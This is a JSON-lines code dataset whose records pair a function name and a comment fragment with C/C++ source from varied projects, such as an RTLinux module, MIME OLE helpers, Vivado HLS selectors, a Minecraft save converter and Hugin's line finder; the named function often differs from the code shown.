{"content":"{'function_name': 'rt_mm_request', 'docstring': '\/*\\n         *        \u901a\u8fc7\u8bbe\u7f6e\u6807\u5fd7\u4f4d\u901a\u77e5kmalloc_thread\u5185\u6838\u7ebf\u7a0b\u7533\u8bf7\u5185\u5b58\\n         *\/', 'code': 'int init_module(void)\\n{\\n        pthread_attr_t attr;\\n        struct sched_param p;\\n        int ret;\\n        \\n        rtf_destroy(0); \\n        rtf_destroy(1);\\n        rt_com_clr_in(0);\\n        rt_com_clr_out(0);\\n        \\n        \/* \u521b\u5efa\u5b9e\u65f6\u7ba1\u9053\uff0c\u7528\u4e8eRT\u6a21\u5757\u548c\u666e\u901a\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u901a\u4fe1 *\/\\n        int fifo_status = rtf_create(0,100);\\n        if(fifo_status)\\n                dbg_print(\"FIFO Create failed!\");\\n        \\n        fifo_status = rtf_create(1, 4000);\\n        if(fifo_status)\\n                dbg_print(\"FIFO Create failed!\");\\n        \\n        \/* \u8bbe\u7f6e\u5b9e\u65f6\u4e32\u53e3\uff0c\u7528\u4e8eRT\u6a21\u5757\u63a7\u5236\u4e32\u53e3\u8f93\u51fa *\/\\n        rt_com_setup(0, 9600, RT_COM_PARITY_NONE, 1, 8);\\n        \\n        hrtime_t now = gethrtime();\\n\\n        pthread_attr_init(&attr);\\n        pthread_mutex_init(&cache_mutex, NULL);\\n        pthread_attr_setfp_np(&attr, 1);\\n\\n        \/* pulse_generate_thread *\/\\n        ret = pthread_create(&pulse_generate_pthread, &attr, \\n                pulse_generate_thread, (void *)0);\\n        if (!ret)\\n                pulse_generate_thread_created = 1;\\n        pthread_make_periodic_np (pulse_generate_pthread, now + 2 * 240000, 80000);\\n        p . sched_priority = 1;\\n        pthread_setschedparam (pulse_generate_pthread, SCHED_FIFO, &p);\\n        \\n        \/* main_ctrl_thread *\/\\n        ret = pthread_create(&main_ctrl_pthread, &attr, main_ctrl_thread, (void *)1);\\n        if (!ret) \\n                main_ctrl_thread_created=1;\\n        pthread_make_periodic_np (main_ctrl_pthread, now + 2 * 160000, 30000);\\n        p . sched_priority = 2;\\n        pthread_setschedparam (main_ctrl_pthread, SCHED_FIFO, &p);\\n        \\n        init_waitqueue_head(&wq);\\n        kmalloc_kthread_id = kernel_thread(kmalloc_thread, NULL, 0);\\n        if (kmalloc_kthread_id < 0) {\\n                printk(KERN_ERR \"fork failed, errno %d\\\\n\", -kmalloc_kthread_id);\\n                return kmalloc_kthread_id;\\n        }\\n        \\n        return ret;\\n}'}","id":3101}
{"content":"{'function_name': 'negBranchCond', 'docstring': '\/\/ Not reachable', 'code': 'int setFlag(Flag f)\\n{\\n  switch (f) {\\n    case ZS: return 0;\\n    case ZC: return 1;\\n    case NS: return -1;\\n    case NC: return 0;\\n  }\\n\\n  \/\/ Not reachable\\n  assert(false);\\n}'}","id":3102}
{"content":"{'function_name': 'MimeOleGetFileInfo', 'docstring': '\/\/ Only pass in parameters for items that \\r', 'code': 'MIMEOLEAPI MimeOleGetFileInfoW(\\r\\n                              LPWSTR    pszFilePath,  LPWSTR   *ppszCntType,\\r\\n                              LPWSTR   *ppszSubType,  LPWSTR   *ppszCntDesc,\\r\\n                              LPWSTR   *ppszFileName, LPWSTR   *ppszExtension)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    SHFILEINFOW     rShFileInfo;\\r\\n    LPWSTR          pszFull=NULL,\\r\\n                    pszExt,\\r\\n                    pszFname;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == pszFilePath)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    if (ppszCntType)\\r\\n        *ppszCntType = NULL;\\r\\n    if (ppszSubType)\\r\\n        *ppszSubType = NULL;\\r\\n    if (ppszCntDesc)\\r\\n        *ppszCntDesc = NULL;\\r\\n    if (ppszFileName)\\r\\n        *ppszFileName = NULL;\\r\\n    if (ppszExtension)\\r\\n        *ppszExtension = NULL;\\r\\n\\r\\n    \/\/ Locate the extension of the file\\r\\n    pszFname = PathFindFileNameW(pszFilePath);\\r\\n    pszExt = PathFindExtensionW(pszFilePath);\\r\\n\\r\\n    \/\/ Did the user want the actual filename...\\r\\n    if (ppszFileName)\\r\\n    {\\r\\n        \/\/ Allocate\\r\\n        *ppszFileName = PszDupW(pszFname);\\r\\n        if (NULL == *ppszFileName)\\r\\n        {\\r\\n            hr = TrapError(E_OUTOFMEMORY);\\r\\n            goto exit;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Empty extension\\r\\n    if (FIsEmptyW(pszExt))\\r\\n    {\\r\\n        hr = TrapError(E_FAIL);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ User wanted the extension\\r\\n    if (ppszExtension)\\r\\n    {\\r\\n        \/\/ Allocate\\r\\n        *ppszExtension = PszDupW(pszExt);\\r\\n        if (NULL == *ppszExtension)\\r\\n        {\\r\\n            hr = TrapError(E_OUTOFMEMORY);\\r\\n            goto exit;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ User wanted ppszCntDesc\\r\\n    if (ppszCntDesc)\\r\\n    {\\r\\n        \/\/ Lets try to get the extension file information first\\r\\n        if (SHGetFileInfoWrapW(pszExt, FILE_ATTRIBUTE_NORMAL, &rShFileInfo, sizeof(rShFileInfo), SHGFI_USEFILEATTRIBUTES | SHGFI_DISPLAYNAME | SHGFI_TYPENAME))\\r\\n        {\\r\\n            \/\/ Set lppszCntDesc + ( )\\r\\n            DWORD cchSize = (lstrlenW(rShFileInfo.szDisplayName) + lstrlenW(rShFileInfo.szTypeName) + 5);\\r\\n            *ppszCntDesc = PszAllocW(cchSize);\\r\\n            if (NULL == *ppszCntDesc)\\r\\n            {\\r\\n                hr = TrapError(E_OUTOFMEMORY);\\r\\n                goto exit;\\r\\n            }\\r\\n\\r\\n            \/\/ Format the string\\r\\n            wnsprintfW(*ppszCntDesc, cchSize, L\"%s, (%s)\", rShFileInfo.szDisplayName, rShFileInfo.szTypeName);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Content type\\r\\n    if (ppszCntType && ppszSubType)\\r\\n    {\\r\\n        \/\/ Lookup content type\\r\\n        if (SUCCEEDED(MimeOleGetExtContentTypeW(pszExt, &pszFull)))\\r\\n        {\\r\\n            \/\/ Split content type\\r\\n            CHECKHR(hr = MimeOleSplitContentType(pszFull, ppszCntType, ppszSubType));\\r\\n        }\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Set defaults if something was not found...\\r\\n    if (ppszCntType && NULL == *ppszCntType)\\r\\n        *ppszCntType = PszDupW((LPWSTR)STR_CNT_APPLICATIONW);\\r\\n    if (ppszSubType && NULL == *ppszSubType)\\r\\n        *ppszSubType = PszDupW((LPWSTR)STR_SUB_OCTETSTREAMW);\\r\\n    if (ppszCntDesc && NULL == *ppszCntDesc)\\r\\n        *ppszCntDesc = PszDupW((LPWSTR)c_szEmptyW);\\r\\n\\r\\n    \/\/ Cleanup\\r\\n    SafeMemFree(pszFull);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":3112}
{"content":"{'function_name': 'denoiseb_rd46_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd47_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd47 read pattern: { denoiseb_update_0[d0, d1] -> raw[3 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1930 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (969 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_1930();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3130}
{"content":"{'function_name': 'PyShowAd', 'docstring': '\/\/ an ad-view-complete message ourself so the event flow is similar..', 'code': 'static auto PyShowAd2(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n\\n  BA_PRECONDITION(g_base->InLogicThread());\\n  const char* purpose;\\n  PyObject* on_completion_call_obj = Py_None;\\n  int pass_actually_showed = true;\\n  static const char* kwlist[] = {\"purpose\", \"on_completion_call\", nullptr};\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"s|O\", const_cast<char**>(kwlist), &purpose,\\n          &on_completion_call_obj, &pass_actually_showed)) {\\n    return nullptr;\\n  }\\n  g_base->plus()->SetAdCompletionCall(on_completion_call_obj,\\n                                      static_cast<bool>(pass_actually_showed));\\n\\n  \/\/ In cases where we support ads, store our callback and kick one off.\\n  \/\/ We\\'ll then fire our callback once its done.\\n  \/\/ If we *don\\'t* support ads, just store our callback and then kick off\\n  \/\/ an ad-view-complete message ourself so the event flow is similar..\\n  if (g_core->platform->GetHasAds()) {\\n    g_core->platform->ShowAd(purpose);\\n  } else {\\n    g_base->plus()->PushAdViewComplete(purpose, false);\\n  }\\n  Py_RETURN_NONE;\\n  BA_PYTHON_CATCH;\\n}'}","id":3132}
{"content":"{'function_name': 'mcpe_db_options', 'docstring': '\/\/ do we need to free these?', 'code': 'int main(int argc, const char **argv)\\n{\\n    \/\/ Mostly copied from args\\' README\\n    args::ArgumentParser parser(\\n        \"Converts data stored in Minecraft Bedrock\\'s \"\\n        \"save file format to JSON\");\\n    args::HelpFlag help(\\n        parser, \"help\", \"Display this help menu\", {\\'h\\', \"help\"});\\n    args::Positional<fs::path> origin(\\n        parser, \"in\", \"Input path, can be a file or a directory\",\\n        args::Options::Required);\\n    args::Positional<fs::path> dest(\\n        parser, \"out\", \"Output path, can be a directory or a file\",\\n        args::Options::Required);\\n    try {\\n        parser.ParseCLI(argc, argv);\\n    } catch(args::Help) {\\n        std::cout << parser;\\n        return 0;\\n    } catch (args::ParseError e) {\\n        std::cerr << e.what() << std::endl;\\n        std::cerr << parser;\\n        return 1;\\n    } catch (args::ValidationError e) {\\n        std::cerr << e.what() << std::endl;\\n        std::cerr << parser;\\n        return 1;\\n    }\\n    const auto in = args::get(origin);\\n    const auto out = args::get(dest);\\n\\n    if (fs::is_directory(in)) {\\n        std::ofstream out_stream(out);\\n        if (!out_stream.good()) {\\n            std::cerr << \"Failed to open output file \"\\n                      << out << \" for writing\" << std::endl;\\n            return 1;\\n        }\\n\\n        std::unique_ptr<ldb::DB> db;\\n        auto options = mcpe_db_options();\\n        options.create_if_missing = false;\\n        try {\\n            db = db_open(in, options);\\n        } catch (LevelDBStatusError e) {\\n            std::cerr << \"Failed to open database: \"\\n                      << e.what() << std::endl;\\n            return 1;\\n        }\\n        json json_root;\\n        try {\\n            json_root = ldb_to_json(*db);\\n        } catch (ConversionError e) {\\n            std::cerr\\n                << \"Failed to convert saves db to json: \"\\n                << e.what() << std::endl;\\n                return 1;\\n        }\\n        out_stream << json_root.dump(4) << std::endl;\\n    } else if (fs::is_directory(out)) {\\n        std::ifstream in_json(in);\\n        if (!in_json.good()) {\\n            std::cerr << \"Failed to open input file \"\\n                      << in << \" for reading\" << std::endl;\\n            return 1;\\n        }\\n        auto options = mcpe_db_options();\\n        \/\/ kinda redundant\\n        options.create_if_missing = true;\\n        options.error_if_exists = true;\\n        std::unique_ptr<ldb::DB> db;\\n        try {\\n            db = db_open(out, options);\\n        } catch (LevelDBStatusError e) {\\n            std::cerr << \"Failed to open database: \"\\n                      << e.what() << std::endl; \\n            return 1;\\n        }\\n        json parsed;\\n        in_json >> parsed;\\n        try {\\n            json_to_ldb(*db, parsed);\\n        } catch (ConversionError e) {\\n            std::cerr\\n                << \"Failed to convert json to saves db: \"\\n                << e.what() << std::endl;\\n                return 1;\\n        }\\n    } else {\\n        std::cerr <<\\n            \"Either input path or output path must be a \"\\n            \"valid directory while the other argument must \"\\n            \"be a path to a file.\" << std::endl;\\n        return 1;\\n    }\\n    return 0;\\n}'}","id":3134}
{"content":"{'function_name': 'MimeOleGetPropW', 'docstring': '\/\/ Return the Data\\r', 'code': 'MIMEOLEAPI MimeOleSetPropW(\\r\\n                           IMimePropertySet   *pPropertySet,\\r\\n                           LPCSTR              pszName,\\r\\n                           DWORD               dwFlags,\\r\\n                           LPWSTR              pszData)\\r\\n{\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pPropertySet)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPWSTR;\\r\\n    rVariant.pwszVal = (LPWSTR)pszData;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    return TrapError(pPropertySet->SetProp(pszName, dwFlags, &rVariant));\\r\\n}'}","id":3137}
{"content":"{'function_name': 'Read_BdlFilePath', 'docstring': '\/\/ ex) OPEN-READ.BDL ', 'code': 'void AFX_CDECL MyTrace(PRT_TYPE prtType, LPCTSTR lpszFormat, ...)\\n{\\n#ifdef _DEBUG \/\/ all AfxTrace output is controlled by afxTraceEnabled\\n\\tif (!afxTraceEnabled)\\n\\t\\treturn;\\n#endif\\n\\tWORD  bitMask = 0x01 << prtType;\\n\\tif (!(g_wPrintState & bitMask)) \/\/ check print bit_mask\\n\\t\\treturn;\\n\\n\\tva_list args;\\n\\tva_start(args, lpszFormat);\\n\\n\\tint nBuf;\\n\\tTCHAR szBuffer[2048];\\n\\n\\tnBuf = _vsntprintf(szBuffer, sizeof(szBuffer), lpszFormat, args);\\n\\n\\t\/\/ was there an error? was the expanded string too long?\\n\\tASSERT(nBuf >= 0);\\n\\n\\tif ((afxTraceFlags & traceMultiApp) && (AfxGetApp() != NULL))\\n\\t\\tafxDump << AfxGetApp()->m_pszExeName << \": \";\\n\\tafxDump << szBuffer;\\n\\n\\tva_end(args);\\n}'}","id":3138}
{"content":"{'function_name': 'denoiseb_rd32_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd33_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd33 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 966 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_966();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3141}
{"content":"{'function_name': 'setup', 'docstring': '\/\/calculations used from the table provided in the data sheet of ds18b20\\r', 'code': 'bool tempInit(const int pin)\\r\\n{\\r\\n  pinMode(pin,OUTPUT);\/\/ Set OutPut Mode \\r\\n  digitalWrite(pin,HIGH);\\r\\n  delay(1);\\r\\n\\r\\n  \/\/ See datasheet\\r\\n  digitalWrite(pin,LOW);\/\/ Set Low\\r\\n  delayMicroseconds(480);\\r\\n  pinMode(pin,INPUT_PULLUP);\\r\\n  delayMicroseconds(60);\/\/ Wait for 60uSec\\r\\n \\r\\n  bool device = digitalRead(pin)?1:0; \/\/ 0-Present; 1-Not present\\r\\n  delayMicroseconds(480);\\r\\n  return device;\\r\\n}'}","id":3143}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisKeyValuePair_2_t1944347872_m943415488_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4092802079_gshared (Dictionary_2_t3387027560 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t3587090924 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4092802079_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t3587090924 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t3387027560 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t3387027560 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t3587090924 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t3387027560 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t3587090924 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":3144}
{"content":"{'function_name': 'convertGrayToUInt8', 'docstring': '\/\/ float needs to be from min ... max.', 'code': 'int main(int argc, char* argv[])\\n{\\n    \/\/ parse arguments\\n    const char* optstring = \"o:i:l:h\";\\n\\n    static struct option longOptions[] =\\n    {\\n        {\"output\", required_argument, NULL, \\'o\\' },\\n        {\"image\", required_argument, NULL, \\'i\\' },\\n        {\"lines\", required_argument, NULL, \\'l\\' },\\n        {\"help\", no_argument, NULL, \\'h\\' },\\n        0\\n    };\\n\\n    UIntSet cmdlineImages;\\n    int c;\\n    int optionIndex = 0;\\n    int nrLines = 5;\\n    string output;\\n    while ((c = getopt_long (argc, argv, optstring, longOptions,&optionIndex)) != -1)\\n    {\\n        switch (c)\\n        {\\n            case \\'o\\':\\n                output = optarg;\\n                break;\\n            case \\'h\\':\\n                usage(argv[0]);\\n                return 0;\\n            case \\'i\\':\\n                {\\n                    int imgNr=atoi(optarg);\\n                    if((imgNr==0) && (strcmp(optarg,\"0\")!=0))\\n                    {\\n                        cerr << \"Could not parse image number.\";\\n                        return 1;\\n                    };\\n                    cmdlineImages.insert(imgNr);\\n                };\\n                break;\\n            case \\'l\\':\\n                nrLines=atoi(optarg);\\n                if(nrLines<1)\\n                {\\n                    cerr << \"Could not parse number of lines.\";\\n                    return 1;\\n                };\\n                break;\\n            case \\':\\':\\n                cerr <<\"Option \" << longOptions[optionIndex].name << \" requires a number\" << endl;\\n                return 1;\\n                break;\\n            case \\'?\\':\\n                break;\\n            default:\\n                abort ();\\n        }\\n    }\\n\\n    if (argc - optind != 1)\\n    {\\n        cout << \"Warning: \" << argv[0] << \" can only work on one project file at one time\" << endl << endl;\\n        usage(argv[0]);\\n        return 1;\\n    };\\n\\n    string input=argv[optind];\\n    \/\/ read panorama\\n    Panorama pano;\\n    ifstream prjfile(input.c_str());\\n    if (!prjfile.good())\\n    {\\n        cerr << \"could not open script : \" << input << endl;\\n        return 1;\\n    }\\n    pano.setFilePrefix(hugin_utils::getPathPrefix(input));\\n    DocumentData::ReadWriteError err = pano.readData(prjfile);\\n    if (err != DocumentData::SUCCESSFUL)\\n    {\\n        cerr << \"error while parsing panos tool script: \" << input << endl;\\n        cerr << \"DocumentData::ReadWriteError code: \" << err << endl;\\n        return 1;\\n    }\\n\\n    if(pano.getNrOfImages()==0)\\n    {\\n        cerr << \"error: project file does not contains any image\" << endl;\\n        cerr << \"aborting processing\" << endl;\\n        return 1;\\n    };\\n\\n    std::vector<size_t> imagesToProcess;\\n    if(cmdlineImages.size()==0)\\n    {\\n        \/\/no image given, process all\\n        for(size_t i=0;i<pano.getNrOfImages();i++)\\n        {\\n            imagesToProcess.push_back(i);\\n        };\\n    }\\n    else\\n    {\\n        \/\/check, if given image numbers are valid\\n        for(UIntSet::const_iterator it=cmdlineImages.begin();it!=cmdlineImages.end();it++)\\n        {\\n            if((*it)>=0 && (*it)<pano.getNrOfImages())\\n            {\\n                imagesToProcess.push_back(*it);\\n            };\\n        };\\n    };\\n\\n    if(imagesToProcess.size()==0)\\n    {\\n        cerr << \"No image to process found\" << endl << \"Stopping processing\" << endl;\\n        return 1;\\n    };\\n\\n    PT_setProgressFcn(ptProgress);\\n    PT_setInfoDlgFcn(ptinfoDlg);\\n\\n    cout << argv[0] << \" is searching for vertical lines\" << endl;\\n#if _WINDOWS\\n    \/\/multi threading of image loading results sometime in a race condition\\n    \/\/try to prevent this by initialisation of codecManager before\\n    \/\/running multi threading part\\n    std::string s=vigra::impexListExtensions();\\n#endif\\n#ifdef HAS_PPL\\n    size_t nrCPS=pano.getNrOfCtrlPoints();\\n    Concurrency::parallel_for<size_t>(0,imagesToProcess.size(),[&pano,imagesToProcess,nrLines](size_t i)\\n#else\\n    for(size_t i=0;i<imagesToProcess.size();i++)\\n#endif\\n    {\\n        unsigned int imgNr=imagesToProcess[i];\\n        cout << \"Working on image \" << pano.getImage(imgNr).getFilename() << endl;\\n        \/\/ now load and process all images\\n        vigra::ImageImportInfo info(pano.getImage(imgNr).getFilename().c_str());\\n        HuginBase::CPVector foundLines;\\n        if(info.isGrayscale())\\n        {\\n            foundLines=LoadGrayImageAndFindLines(info, pano, imgNr, nrLines);\\n        }\\n        else\\n        {\\n            if(info.isColor())\\n            {\\n                \/\/colour images\\n                foundLines=LoadImageAndFindLines(info, pano, imgNr, nrLines);\\n            }\\n            else\\n            {\\n                std::cerr << \"Image \" << pano.getImage(imgNr).getFilename().c_str() << \" has \" \\n                    << info.numBands() << \" channels.\" << std::endl\\n                    << \"Linefind works only with grayscale or color images.\" << std::endl\\n                    << \"Skipping image.\" << std::endl;\\n            };\\n        };\\n#ifndef HAS_PPL\\n        cout << \"Found \" << foundLines.size() << \" vertical lines\" << endl;\\n#endif\\n        if(foundLines.size()>0)\\n        {\\n            for(CPVector::const_iterator cpIt=foundLines.begin(); cpIt!=foundLines.end(); cpIt++)\\n            {\\n                pano.addCtrlPoint(*cpIt);\\n            };\\n        };\\n    }\\n#ifdef HAS_PPL\\n    );\\n    cout << endl << \"Found \" << pano.getNrOfCtrlPoints() - nrCPS << \" vertical lines\" << endl << endl;\\n#endif\\n\\n    \/\/write output\\n    UIntSet imgs;\\n    fill_set(imgs,0, pano.getNrOfImages()-1);\\n    \/\/ Set output .pto filename if not given\\n    if (output==\"\")\\n    {\\n        output=input.substr(0,input.length()-4).append(\"_lines.pto\");\\n    }\\n    ofstream of(output.c_str());\\n    pano.printPanoramaScript(of, pano.getOptimizeVector(), pano.getOptions(), imgs, false, hugin_utils::getPathPrefix(input));\\n\\n    cout << endl << \"Written output to \" << output << endl;\\n    return 0;\\n}'}","id":3148}
{"content":"{'function_name': 'print_tree', 'docstring': '\/\/base case\\r', 'code': 'void mirror_tree(binarytree* node){\\r\\n\\tif(node==NULL)return ;\\r\\n\\tif(node->left!=NULL && node->right!=NULL)\\r\\n\\t{\\r\\n\\t\\tbinarytree* p;\\r\\n\\t\\tp = node->left;\\r\\n\\t\\tnode->left = node->right;\\r\\n\\t\\tnode->right = p;\\r\\n\\t}\\r\\n\/\/\\tswap(node->left, node->right);\\r\\n\\tmirror_tree(node->left);\\r\\n\\tmirror_tree(node->right);\\r\\n}'}","id":3151}
{"content":"{'function_name': 'df', 'docstring': '\/\/declaram un pointer local', 'code': 'int main()\\n{\\n    in>>n>>m;\\n    \/\/adaugam elementele in lista\\n    for(int i=1;i<=m;++i){\\n        in>>x>>y;\\n        actual=new nod;\\n        actual->vecin=y;\\n        actual->urm=l[x];\\n        l[x]=actual;\\n\\n        actual=new nod;\\n        actual->vecin=x;\\n        actual->urm=l[y];\\n        l[y]=actual;\\n    }\\n    \/\/determinam nr de componente conexe\\n    for(int i=1;i<=n;++i)\\n        if(viz[i]==false){\\n            df(i);\\n            ++nr;\\n        }\\n    out<<nr;\\n    return 0;\\n}'}","id":3153}
